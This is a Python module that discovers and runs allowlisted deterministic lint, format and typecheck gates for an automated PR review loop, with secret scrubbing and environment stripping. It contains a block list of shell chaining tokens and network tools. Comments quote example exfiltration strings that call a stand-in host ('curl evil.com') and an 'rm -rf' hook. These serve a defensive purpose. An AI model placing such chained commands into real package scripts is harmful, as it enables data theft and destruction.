"""Deterministic gates for ``pdd checkup --pr --review-loop``.

The review loop's LLM reviewer (codex/claude/gemini) can declare a PR
"clean" while a fast, deterministic local check still fails on the
worktree (e.g. ``prettier --check`` finds unformatted files). This
module discovers a conservative, allowlisted set of repo-local gates,
runs each as a bounded list-form subprocess, and converts failures into
synthetic blocker ``ReviewFinding`` entries that the review loop must
treat exactly like reviewer findings: refuse the clean verdict, feed
them to the fixer, and re-run gates on the next round.

Trust-boundary invariants:
* All commands are list-form. ``shell=True`` is never used.
* Discovery is allowlist-only. Anything not explicitly recognized is
  skipped, not best-effort guessed.
* The runner never raises. ``subprocess.run`` errors are captured as
  ``GateResult`` rows with ``exit_code=None`` and a non-empty ``error``.
* All stdout/stderr is truncated to roughly 10KB each side and scrubbed
  via ``pdd.checkup_review_loop._scrub_secrets`` before persistence or
  rendering.
* Environment is scrubbed: ``CI=1``, ``NO_COLOR=1``, ``FORCE_COLOR=0`` are
  injected; ``PDD_*`` mutating envs are stripped so a gate cannot inherit
  reviewer/fixer state.
* The runner's ``cwd`` is always the loop-owned PR worktree.
"""

from __future__ import annotations

import datetime as _dt
import json
import logging
import os
import re
import shutil
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Sequence, Tuple

logger = logging.getLogger(__name__)


# Approximate per-stream excerpt cap. Bounded to keep prompt injection
# tractable and to keep persisted artifacts small. We leave a generous
# margin over the literal byte count so a small "[truncated]" marker
# fits without violating the integration-side budget contract.
_EXCERPT_LIMIT = 10_000

# Per-gate default timeout in seconds. The runner enforces this even
# when ``Gate.timeout`` is left at the dataclass default so a discovery
# bug cannot wedge the review loop.
DEFAULT_GATE_TIMEOUT_SECONDS: float = 60.0


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass
class Gate:
    """A single discovered deterministic gate.

    The ``cmd`` field is the literal list-form argv. The runner
    ``run_gates`` is responsible for spawning the subprocess; this
    dataclass is data only.
    """

    name: str
    cmd: List[str]
    source: str
    severity: str = "blocker"
    timeout: float = DEFAULT_GATE_TIMEOUT_SECONDS
    area: str = "deterministic-gate"
    required_fix_hint: str = ""

    def to_dict(self) -> Dict[str, object]:
        return {
            "name": self.name,
            "cmd": list(self.cmd),
            "source": self.source,
            "severity": self.severity,
            "timeout": self.timeout,
            "area": self.area,
            "required_fix_hint": self.required_fix_hint,
        }


@dataclass
class GateResult:
    """Result of executing a single gate.

    ``exit_code is None`` indicates a runner-side failure (timeout,
    missing binary, OSError). In that case ``error`` carries a short
    human-readable description and the gate is treated as a failure by
    ``gate_results_to_findings``.
    """

    gate: Gate
    exit_code: Optional[int]
    stdout_excerpt: str
    stderr_excerpt: str
    duration_seconds: float
    started_at_iso: str
    error: str = ""

    @property
    def passed(self) -> bool:
        return self.exit_code == 0

    def to_dict(self) -> Dict[str, object]:
        return {
            "gate": self.gate.to_dict(),
            "exit_code": self.exit_code,
            "stdout_excerpt": self.stdout_excerpt,
            "stderr_excerpt": self.stderr_excerpt,
            "duration_seconds": self.duration_seconds,
            "started_at_iso": self.started_at_iso,
            "error": self.error,
            "passed": self.passed,
        }


# ---------------------------------------------------------------------------
# Discovery
# ---------------------------------------------------------------------------


# npm script names this module recognizes as deterministic gates. Anything
# else is skipped: discovery is allowlist-only on purpose.
_RECOGNIZED_NPM_SCRIPTS: Tuple[str, ...] = (
    "format:check",
    "prettier:check",
    "lint:check",
    "typecheck",
    "tsc",
    "tsc:noemit",
)

# Substrings whose presence in an npm script command disqualifies the
# script entirely. Mutation, install, or deployment scripts must never
# run from a checkup gate.
_FORBIDDEN_SCRIPT_FRAGMENTS: Tuple[str, ...] = (
    "--write",
    "--fix",
    "install",
    "publish",
    "deploy",
    "start",
    " build",
    "build:",
    "git push",
    "rm -",
    "rimraf",
)


# Shell metacharacters and compound-command operators. npm/yarn/pnpm
# scripts run through ``<runner> run <name>`` which invokes a shell on
# the script body, so ANY metacharacter that lets a script chain or
# substitute commands turns the allowlist into a foothold:
# ``"format:check": "prettier --check && curl evil.com"`` would pass
# the head check and then execute the appended exfiltration. Reject
# the whole script when any of these tokens appear. List spans the
# minimum metachar set codex review iteration 1 Finding 1 requested
# plus the obvious shell-out binaries.
#
# POSIX shell metacharacters only. Windows cmd.exe metacharacters
# (e.g. ``^``, ``%VAR%``) are out of v1 scope: PDD is a Unix-first
# project and ``package.json`` scripts are conventionally written for
# POSIX shells (codex review iteration 2, Finding 3 — info).
_SHELL_METACHAR_TOKENS: Tuple[str, ...] = (
    "&&",
    "||",
    ";",
    "|",
    "&",
    "`",
    "$(",
    "${",
    ">",
    ">>",
    "<",
    "<<",
    "\n",
    "\r",
    " curl ",
    " wget ",
    " nc ",
    " bash ",
    " sh ",
    " eval ",
    "node -e",
)


# Heads (after stripping the package manager prefix like ``npm run``) that
# we accept as gate-style commands.
_ACCEPTABLE_SCRIPT_HEADS: Tuple[str, ...] = (
    "prettier --check",
    "tsc --noemit",
    "tsc -p",
    "eslint",  # ``eslint`` alone is only accepted when no fix flag appears.
)


def _detect_node_runner(worktree: Path) -> str:
    """Return the package manager binary to invoke for npm scripts.

    Prefers ``pnpm``/``yarn``/``bun`` lockfiles over plain ``npm``. The
    return value is the literal argv[0]; the caller appends ``run`` +
    script name.
    """
    if (worktree / "pnpm-lock.yaml").exists():
        return "pnpm"
    if (worktree / "yarn.lock").exists():
        return "yarn"
    if (worktree / "bun.lockb").exists():
        return "bun"
    return "npm"


def _script_is_acceptable(command: str) -> bool:
    """Return True when an npm-script command-string is allowlisted.

    The npm-run path delegates to ``<runner> run <name>`` which spawns a
    shell for the script body. Anything beyond a single recognised tool
    head and its arguments must be rejected:
    * ``_FORBIDDEN_SCRIPT_FRAGMENTS`` blocks mutation/install/deploy
      semantics even when wrapped in an allowlisted head.
    * ``_SHELL_METACHAR_TOKENS`` blocks command chaining and substitution
      so a script body like ``prettier --check && curl evil.com`` cannot
      slip through the head check.

    The metachar check is performed against the ORIGINAL (case-preserved)
    command for substrings that are case-sensitive (e.g. ``$(``), and
    against the lower-cased form for word-style fragments (e.g.
    ``" curl "``). Both modes are inclusive: any match rejects the
    script.
    """
    if not command:
        return False
    lowered = command.lower()
    for forbidden in _FORBIDDEN_SCRIPT_FRAGMENTS:
        if forbidden in lowered:
            return False
    # Case-sensitive shell metachar / substitution / redirection /
    # newline / lead-with-shell-binary tokens. Tokens carrying a space
    # are matched space-padded to avoid clobbering legitimate paths like
    # ``./sh-test/`` while still catching `` bash `` / `` sh `` / `` nc ``.
    padded = " " + lowered + " "
    for token in _SHELL_METACHAR_TOKENS:
        if token.startswith(" ") and token.endswith(" "):
            if token in padded:
                return False
        else:
            if token in command or token in lowered:
                return False
    # Strip leading package-manager prefix so that
    # ``npm run format:check`` and ``yarn format:check`` both reduce to
    # the recognised tool head.
    stripped = lowered
    for prefix in (
        "npm run ",
        "yarn run ",
        "pnpm run ",
        "bun run ",
        "npx ",
        "yarn ",
        "pnpm ",
        "bun ",
    ):
        if stripped.startswith(prefix):
            stripped = stripped[len(prefix) :].lstrip()
            break
    for head in _ACCEPTABLE_SCRIPT_HEADS:
        if stripped.startswith(head):
            # eslint without an explicit ``--fix``/no-fix marker — the
            # script could mutate the worktree on certain configs, so
            # we require an explicit ``--no-fix`` to opt in.
            if head == "eslint" and "--fix" in stripped:
                return False
            return True
    return False


def _discover_npm_gates(worktree: Path) -> List[Gate]:
    package_json = worktree / "package.json"
    if not package_json.is_file():
        return []
    try:
        data = json.loads(package_json.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        logger.debug("checkup-gates: package.json unreadable: %s", exc)
        return []
    scripts = data.get("scripts") or {}
    if not isinstance(scripts, dict):
        return []
    runner = _detect_node_runner(worktree)
    gates: List[Gate] = []
    for script_name, script_command in scripts.items():
        if script_name not in _RECOGNIZED_NPM_SCRIPTS:
            continue
        if not isinstance(script_command, str):
            continue
        if not _script_is_acceptable(script_command):
            continue
        # npm/yarn/pnpm/bun all execute ``pre<name>`` and ``post<name>``
        # lifecycle hooks around ``<runner> run <name>``. Discovery only
        # inspects the named script; if a malicious or untrusted PR adds
        # ``preformat:check`` with ``curl evil.com`` or ``rm -rf``, that
        # hook still fires when we invoke the validated script. Refuse to
        # discover the gate when ANY pre/post hook exists for it, even an
        # empty string — operators can drop the hook or rename the script
        # to opt back in. We do not try to validate the hook body, because
        # the gate value here (a generic format/typecheck) is not worth
        # the attack surface of allowlisting more shell snippets.
        if (
            f"pre{script_name}" in scripts
            or f"post{script_name}" in scripts
        ):
            logger.debug(
                "checkup-gates: skipping npm:%s — pre/post lifecycle hook present",
                script_name,
            )
            continue
        gates.append(
            Gate(
                name=f"npm:{script_name}",
                cmd=[runner, "run", script_name],
                source=f"package.json:scripts.{script_name}",
                required_fix_hint=(
                    f"Run `{runner} run {script_name}` locally and address the "
                    "reported issues."
                ),
            )
        )
    # If a typescript config exists and we did not emit a typecheck
    # script, try ``npx tsc --noEmit`` directly. Discovery rule: only when
    # ``typescript`` appears in the dependency map AND ``tsconfig.json``
    # exists AND ``node_modules/typescript/bin/tsc`` is already on disk.
    #
    # The local node_modules check is load-bearing for determinism: bare
    # ``npx tsc`` will silently fall back to a network install (npm
    # registry hit + arbitrary install lifecycle) when typescript is
    # declared in ``package.json`` but not actually installed in the
    # worktree. That turns the "deterministic local gate" into a
    # network/install/exec, which is exactly the attack surface the
    # issue forbids (issue #1092 product requirement: gates must be
    # local, deterministic, bounded, and non-mutating).
    if (
        (worktree / "tsconfig.json").exists()
        and "npm:typecheck" not in {g.name for g in gates}
        and "npm:tsc" not in {g.name for g in gates}
        and "npm:tsc:noemit" not in {g.name for g in gates}
    ):
        deps: Dict[str, object] = {}
        for key in ("dependencies", "devDependencies", "peerDependencies"):
            value = data.get(key) or {}
            if isinstance(value, dict):
                deps.update(value)
        tsc_local = worktree / "node_modules" / "typescript" / "bin" / "tsc"
        if (
            "typescript" in deps
            and tsc_local.is_file()
            and shutil.which("npx")
        ):
            gates.append(
                Gate(
                    # Pass ``--no-install`` so npx refuses to fall back
                    # to a registry fetch even if a future npm rewires
                    # the local-binary resolution path. Belt-and-braces:
                    # the local-tsc check above is the primary guard.
                    name="tsc-noemit",
                    cmd=["npx", "--no-install", "tsc", "--noEmit"],
                    source="tsconfig.json",
                    required_fix_hint=(
                        "Run `npx tsc --noEmit` locally and fix the reported "
                        "TypeScript errors."
                    ),
                )
            )
    return gates


def _discover_python_gates(
    worktree: Path, changed_files: Sequence[str]
) -> List[Gate]:
    gates: List[Gate] = []
    changed_py = [
        rel for rel in changed_files if rel.endswith(".py") and (worktree / rel).is_file()
    ]
    for rel in changed_py:
        gates.append(
            Gate(
                name=f"py-compile:{rel}",
                cmd=[sys.executable, "-m", "py_compile", str(worktree / rel)],
                source=rel,
                required_fix_hint=(
                    f"Fix the syntax error in {rel} so `python -m py_compile` "
                    "succeeds."
                ),
            )
        )
    pyproject = worktree / "pyproject.toml"
    pyproject_text = ""
    if pyproject.is_file():
        try:
            pyproject_text = pyproject.read_text(encoding="utf-8")
        except OSError as exc:
            logger.debug("checkup-gates: pyproject.toml unreadable: %s", exc)
            pyproject_text = ""

    def _tool_section_present(section: str) -> bool:
        if not pyproject_text:
            return False
        return bool(
            re.search(
                rf"^\s*\[\s*tool\.{re.escape(section)}\s*\](?:\s|$)",
                pyproject_text,
                re.MULTILINE,
            )
        )

    if changed_py and _tool_section_present("ruff") and shutil.which("ruff"):
        gates.append(
            Gate(
                name="ruff",
                cmd=["ruff", "check", *changed_py],
                source="pyproject.toml:[tool.ruff]",
                required_fix_hint=(
                    "Run `ruff check --fix` locally and address the remaining "
                    "issues."
                ),
            )
        )
    if changed_py and _tool_section_present("black") and shutil.which("black"):
        gates.append(
            Gate(
                name="black",
                cmd=["black", "--check", *changed_py],
                source="pyproject.toml:[tool.black]",
                required_fix_hint=(
                    "Run `black .` locally and commit the formatting changes."
                ),
            )
        )
    if changed_py and _tool_section_present("mypy") and shutil.which("mypy"):
        gates.append(
            Gate(
                name="mypy",
                cmd=["mypy", *changed_py],
                source="pyproject.toml:[tool.mypy]",
                required_fix_hint=(
                    "Run `mypy` locally and fix the reported type errors."
                ),
            )
        )
    return gates


def _resolve_pr_base_spec(worktree: Path, base_ref: Optional[str]) -> Optional[str]:
    """Resolve ``base_ref`` to a refspec verifiable inside ``worktree``.

    Returns the resolved refspec (e.g. ``"origin/main"``) when it exists,
    or ``None`` when no candidate verifies. Tried in order:

    1. The caller-supplied ``base_ref`` itself (already qualified).
    2. ``origin/<base_ref>`` (fetched PR base).
    3. ``origin/main`` / ``origin/master`` / ``main`` / ``master``.

    Verification uses ``git rev-parse --verify`` with a short timeout
    and never raises: a non-git worktree, missing tool, or hang returns
    ``None`` and the caller falls back to the working-tree-only check.
    """
    candidates: List[str] = []
    if base_ref:
        # When the caller already resolved a fully-qualified ref
        # (e.g. ``refs/remotes/pdd-checkup/pr-1095/base`` populated by
        # ``_refresh_pr_base_ref``), try it FIRST and do not also try
        # ``origin/refs/...`` — that path is guaranteed to fail and
        # just wastes a git-rev-parse call on every gate-discovery
        # invocation.
        if base_ref.startswith("refs/"):
            candidates.append(base_ref)
        else:
            # Prefer the remote-tracking ref so we compare against the
            # PR's actual target. A naked ``main`` may be ahead of
            # ``origin/main`` if a local merge has happened in the
            # worktree.
            candidates.append(f"origin/{base_ref}")
            candidates.append(base_ref)
    candidates.extend(["origin/main", "origin/master", "main", "master"])
    seen: set = set()
    for cand in candidates:
        if cand in seen:
            continue
        seen.add(cand)
        try:
            res = subprocess.run(
                ["git", "-C", str(worktree), "rev-parse", "--verify", cand],
                capture_output=True,
                text=True,
                check=False,
                timeout=5,
            )
        except (OSError, subprocess.SubprocessError) as exc:
            logger.debug("checkup-gates: base verify failed for %r: %s", cand, exc)
            continue
        if res.returncode == 0 and res.stdout.strip():
            return cand
    return None


def _git_diff_check_gate(base_spec: Optional[str] = None) -> Gate:
    """Build the ``git diff --check`` gate.

    When ``base_spec`` is provided the gate runs against the PR range
    (``<base>...HEAD``) so a committed whitespace/conflict-marker
    failure is caught even when the worktree itself is clean. When no
    base is resolvable (synthetic tests, detached HEAD, etc.) we fall
    back to the plain working-tree check — strictly weaker but
    preserves the existing single-commit smoke-test contract.
    """
    if base_spec:
        return Gate(
            name="git-diff-check",
            cmd=["git", "diff", "--check", f"{base_spec}...HEAD"],
            source=f"git:{base_spec}...HEAD",
            required_fix_hint=(
                f"Run `git diff --check {base_spec}...HEAD` locally and fix "
                "the whitespace/conflict marker issues it reports in the PR diff."
            ),
        )
    return Gate(
        name="git-diff-check",
        cmd=["git", "diff", "--check"],
        source="git",
        required_fix_hint=(
            "Run `git diff --check` locally and fix the whitespace/conflict "
            "marker issues it reports."
        ),
    )


def _is_git_worktree(worktree: Path) -> bool:
    """Return True when ``worktree`` is inside a git checkout.

    A non-git directory (typical in unit tests that mock
    ``_setup_pr_worktree``) cannot run ``git diff --check``, so the
    gate is omitted to keep the loop's existing fail-open contract for
    those callers. Production review loops always run inside a real
    ``git fetch pull/N/head`` worktree so this guard is invisible there.
    """
    if (worktree / ".git").exists():
        return True
    try:
        result = subprocess.run(
            ["git", "-C", str(worktree), "rev-parse", "--is-inside-work-tree"],
            capture_output=True,
            text=True,
            check=False,
            timeout=5,
        )
    except (OSError, subprocess.SubprocessError):
        return False
    return result.returncode == 0 and result.stdout.strip() == "true"


def discover_gates(
    worktree: Path,
    changed_files: Sequence[str],
    *,
    extra_allow: Sequence[str] = (),
    base_ref: Optional[str] = None,
) -> List[Gate]:
    """Return the conservative deterministic gate set for ``worktree``.

    ``changed_files`` is the PR's changed-file inventory (POSIX relative
    paths). It scopes per-file gates such as ``py_compile``, ``ruff``,
    ``black`` and ``mypy``.

    ``extra_allow`` is a tuple of additional gate-name allowlist entries
    supplied by the operator. Currently this is a forward-compatibility
    hook: every discovered gate is allowlist-only and ``extra_allow`` is
    threaded through but not yet used to widen discovery. The argument is
    accepted so the CLI surface and the discovery surface can co-evolve
    without breaking signature stability.

    ``base_ref`` is the PR's target branch (e.g. ``"main"``). When
    provided and verifiable in ``worktree``, the ``git-diff-check`` gate
    runs across the PR range (``<base>...HEAD``) so a committed
    whitespace/conflict-marker failure is caught even when the worktree
    itself is clean. Acceptance criterion from issue #1092.
    """
    _ = extra_allow  # reserved for v2; CLI plumbing already passes it through.
    gates: List[Gate] = []
    if _is_git_worktree(worktree):
        base_spec = _resolve_pr_base_spec(worktree, base_ref)
        gates.append(_git_diff_check_gate(base_spec))
    gates.extend(_discover_npm_gates(worktree))
    gates.extend(_discover_python_gates(worktree, changed_files))
    # Stable order: git-diff-check first, then language-specific gates
    # in discovery order. The runner walks the list left-to-right so
    # operators see consistent artifact filenames across rounds.
    return gates


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------


def _truncate(text: str) -> str:
    """Truncate ``text`` to roughly ``_EXCERPT_LIMIT`` characters.

    When truncation actually fires, append a short marker so an operator
    can tell that the artifact is incomplete.
    """
    if text is None:
        return ""
    if len(text) <= _EXCERPT_LIMIT:
        return text
    marker = "\n[...truncated]\n"
    keep = _EXCERPT_LIMIT - len(marker)
    return text[:keep] + marker


def _safe_slug(name: str) -> str:
    """Filesystem-safe slug for ``name``."""
    return re.sub(r"[^A-Za-z0-9._-]+", "_", name)[:120] or "gate"


def _build_subprocess_env() -> Dict[str, str]:
    """Build the environment dict the runner injects for each gate.

    Inherits the caller's PATH/HOME (so tools resolve), strips ``PDD_*``
    envs (so the gate cannot inherit reviewer/fixer state or token
    files), and forces ``CI=1``, ``NO_COLOR=1``, ``FORCE_COLOR=0`` for
    deterministic non-interactive output.
    """
    env = {
        key: value
        for key, value in os.environ.items()
        if not key.startswith("PDD_")
    }
    env["CI"] = "1"
    env["NO_COLOR"] = "1"
    env["FORCE_COLOR"] = "0"
    return env


def _scrub(text: str) -> str:
    """Run the loop's secret-scrubber over ``text``.

    Imported lazily to avoid an import cycle at module load: the review
    loop module imports ``checkup_gates``, not the other way around.
    """
    try:
        from .checkup_review_loop import _scrub_secrets

        return _scrub_secrets(text)
    except Exception as exc:  # pragma: no cover - defensive
        logger.debug("checkup-gates: secret scrub fell back: %s", exc)
        return text


def _now_iso() -> str:
    return _dt.datetime.now(_dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _execute_one(
    worktree: Path,
    gate: Gate,
    *,
    default_timeout: float,
) -> GateResult:
    """Execute a single gate, capturing stdout/stderr and runner-side errors."""
    started = _now_iso()
    started_monotonic = time.monotonic()
    timeout = gate.timeout if gate.timeout and gate.timeout > 0 else default_timeout
    env = _build_subprocess_env()
    try:
        proc = subprocess.run(
            list(gate.cmd),
            cwd=str(worktree),
            env=env,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        duration = time.monotonic() - started_monotonic
        captured_stdout = ""
        captured_stderr = ""
        if exc.stdout:
            captured_stdout = exc.stdout if isinstance(exc.stdout, str) else exc.stdout.decode(
                "utf-8", "replace"
            )
        if exc.stderr:
            captured_stderr = exc.stderr if isinstance(exc.stderr, str) else exc.stderr.decode(
                "utf-8", "replace"
            )
        return GateResult(
            gate=gate,
            exit_code=None,
            stdout_excerpt=_scrub(_truncate(captured_stdout)),
            stderr_excerpt=_scrub(_truncate(captured_stderr)),
            duration_seconds=duration,
            started_at_iso=started,
            error=f"timed out after {timeout:g}s",
        )
    except (FileNotFoundError, PermissionError, OSError) as exc:
        duration = time.monotonic() - started_monotonic
        return GateResult(
            gate=gate,
            exit_code=None,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=duration,
            started_at_iso=started,
            error=f"{type(exc).__name__}: {exc}",
        )
    except Exception as exc:  # noqa: BLE001 - defensive: never raise
        duration = time.monotonic() - started_monotonic
        return GateResult(
            gate=gate,
            exit_code=None,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=duration,
            started_at_iso=started,
            error=f"{type(exc).__name__}: {exc}",
        )
    duration = time.monotonic() - started_monotonic
    return GateResult(
        gate=gate,
        exit_code=proc.returncode,
        stdout_excerpt=_scrub(_truncate(proc.stdout or "")),
        stderr_excerpt=_scrub(_truncate(proc.stderr or "")),
        duration_seconds=duration,
        started_at_iso=started,
        error="",
    )


def run_gates(
    worktree: Path,
    gates: Sequence[Gate],
    *,
    artifacts_dir: Path,
    round_number: int,
    mode: str,
    default_timeout: float = DEFAULT_GATE_TIMEOUT_SECONDS,
) -> List[GateResult]:
    """Execute every gate in ``gates`` and persist artifacts.

    Returns the list of ``GateResult`` rows in the same order as
    ``gates``. Persists:
    * ``round-{R}-{mode}-gates.json`` — the entire result list as JSON.
    * ``round-{R}-{mode}-gate-{slug}.txt`` — one human-readable per-gate
      artifact for offline inspection.

    Never raises. A runner-side subprocess failure is recorded with
    ``exit_code=None`` and a non-empty ``error``; the caller is expected
    to treat that as a gate failure via ``gate_results_to_findings``.
    """
    try:
        artifacts_dir.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        logger.warning(
            "checkup-gates: artifacts dir %s unwritable (%s); "
            "running gates without persistence.",
            artifacts_dir,
            exc,
        )
    results: List[GateResult] = []
    for gate in gates:
        # Execute the gate first; ``_execute_one`` is already
        # exception-safe and returns a ``GateResult`` even on
        # runner-side failure. Persistence is best-effort: if writing
        # the per-gate artifact raises (disk full, read-only fs), we
        # OVERWRITE this gate's result with a runner-error entry so
        # the audit trail records the persistence failure on that
        # specific gate AND the loop sees a failing finding rather
        # than mistaking the gate for "passed". The other gates
        # continue executing.
        result = _execute_one(worktree, gate, default_timeout=default_timeout)
        per_gate_path = (
            artifacts_dir
            / f"round-{round_number}-{mode}-gate-{_safe_slug(gate.name)}.txt"
        )
        try:
            per_gate_path.write_text(_render_per_gate_body(result), encoding="utf-8")
        except Exception as exc:  # noqa: BLE001 - defensive: never raise
            logger.warning(
                "checkup-gates: failed to persist artifact for gate %r: %s",
                gate.name,
                exc,
                exc_info=True,
            )
            # If the gate itself passed, downgrade to a runner-error
            # row so the loop's findings adapter still surfaces the
            # broken persistence. If the gate already failed, keep
            # its original exit code and append the persistence error
            # to ``error`` so the existing failure ride-along stays
            # intact while the operator still sees the artifact gap.
            persistence_error = f"{type(exc).__name__}: {exc}"
            if result.exit_code == 0:
                result = GateResult(
                    gate=result.gate,
                    exit_code=None,
                    stdout_excerpt=result.stdout_excerpt,
                    stderr_excerpt=result.stderr_excerpt,
                    duration_seconds=result.duration_seconds,
                    started_at_iso=result.started_at_iso,
                    error=persistence_error,
                )
            else:
                combined_error = (
                    f"{result.error}; persistence: {persistence_error}"
                    if result.error
                    else persistence_error
                )
                result = GateResult(
                    gate=result.gate,
                    exit_code=result.exit_code,
                    stdout_excerpt=result.stdout_excerpt,
                    stderr_excerpt=result.stderr_excerpt,
                    duration_seconds=result.duration_seconds,
                    started_at_iso=result.started_at_iso,
                    error=combined_error,
                )
        results.append(result)
    manifest = artifacts_dir / f"round-{round_number}-{mode}-gates.json"
    try:
        manifest.write_text(
            json.dumps([result.to_dict() for result in results], indent=2),
            encoding="utf-8",
        )
    except Exception as exc:  # noqa: BLE001 - defensive: never raise
        # The aggregate manifest is best-effort. Per-gate text artifacts
        # (and the in-memory results returned to the caller) are the
        # ship-gate; losing the JSON manifest only hurts later offline
        # audit, so log and continue rather than failing the loop.
        logger.warning(
            "checkup-gates: failed to persist manifest %s: %s",
            manifest,
            exc,
            exc_info=True,
        )
    return results


def _render_per_gate_body(result: GateResult) -> str:
    lines: List[str] = []
    lines.append(f"gate: {result.gate.name}")
    lines.append(f"cmd: {' '.join(result.gate.cmd)}")
    lines.append(f"source: {result.gate.source}")
    lines.append(f"started: {result.started_at_iso}")
    lines.append(f"duration_seconds: {result.duration_seconds:.3f}")
    if result.exit_code is None:
        lines.append("exit_code: <runner-error>")
        lines.append(f"error: {result.error}")
    else:
        lines.append(f"exit_code: {result.exit_code}")
    lines.append("")
    lines.append("---- stdout ----")
    lines.append(result.stdout_excerpt or "")
    lines.append("---- stderr ----")
    lines.append(result.stderr_excerpt or "")
    return "\n".join(lines) + "\n"


# ---------------------------------------------------------------------------
# Findings adapter
# ---------------------------------------------------------------------------


def _build_evidence(result: GateResult) -> str:
    """Render the short evidence string for the synthetic finding.

    ``result.error`` (the volatile runner-side detail — exception class,
    ``[Errno N]`` codes, round-specific artifact paths) lives here only.
    It must NOT leak into ``_build_finding_message`` because the
    ``ReviewFinding.key`` dedup contract (codex review iteration 2,
    Finding 1) requires the message stay constant across rounds for the
    same gate-name; otherwise identical persistence failures across
    rounds produce different keys and the loop spams duplicate findings.
    """
    if result.exit_code is None:
        prefix = "Runner error"
        if result.error:
            prefix += f": {result.error}"
    else:
        prefix = f"Gate exit_code={result.exit_code}"
    cmd_line = " ".join(result.gate.cmd)
    tail = result.stderr_excerpt or result.stdout_excerpt
    if tail:
        tail = tail.strip()
        if len(tail) > 2000:
            tail = tail[:2000] + "\n[...]"
    body = f"{prefix} for `{cmd_line}` ({result.gate.source})."
    if tail:
        body += f"\nOutput tail:\n{tail}"
    return body


def _build_required_fix(result: GateResult) -> str:
    cmd_line = " ".join(result.gate.cmd)
    base = f"Run `{cmd_line}` locally and address the failure"
    if result.gate.required_fix_hint:
        return f"{base}. {result.gate.required_fix_hint}"
    return base + "."


def _build_finding_message(result: GateResult) -> str:
    """Build the ``finding`` field for the synthetic ReviewFinding.

    ``ReviewFinding.key`` is built from
    ``severity|location|finding|required_fix``. To keep the dedup key
    stable across rounds for the same gate, this string MUST be
    deterministic and MUST NOT embed any per-invocation detail such as
    ``result.error`` (which carries exception class names, ``[Errno N]``
    codes, or round-specific artifact paths). The volatile detail lives
    in ``_build_evidence`` (codex review iteration 2, Finding 1).
    """
    if result.exit_code is None:
        return (
            f"Deterministic gate {result.gate.name!r} failed to execute "
            "(runner error)."
        )
    return (
        f"Deterministic gate {result.gate.name!r} failed with exit "
        f"code {result.exit_code}."
    )


def gate_results_to_findings(
    results: Sequence[GateResult],
    *,
    round_number: int,
) -> List["object"]:
    """Convert failed ``GateResult`` rows into ``ReviewFinding`` objects.

    Passed gates are skipped. Failed gates (``exit_code != 0`` OR
    ``exit_code is None``) emit one ``ReviewFinding`` each, with
    ``reviewer = f"gate:{gate.name}"`` so the loop's audit trail can
    distinguish synthetic findings from LLM-reviewer findings.
    """
    # Imported here to avoid the circular dependency at module load.
    from .checkup_review_loop import ReviewFinding

    findings: List[ReviewFinding] = []
    for result in results:
        if result.passed:
            continue
        findings.append(
            ReviewFinding(
                severity=result.gate.severity,
                reviewer=f"gate:{result.gate.name}",
                area=result.gate.area,
                evidence=_build_evidence(result),
                finding=_build_finding_message(result),
                required_fix=_build_required_fix(result),
                location=result.gate.source,
                status="open",
                round_number=round_number,
            )
        )
    return findings


__all__ = [
    "DEFAULT_GATE_TIMEOUT_SECONDS",
    "Gate",
    "GateResult",
    "discover_gates",
    "gate_results_to_findings",
    "run_gates",
]
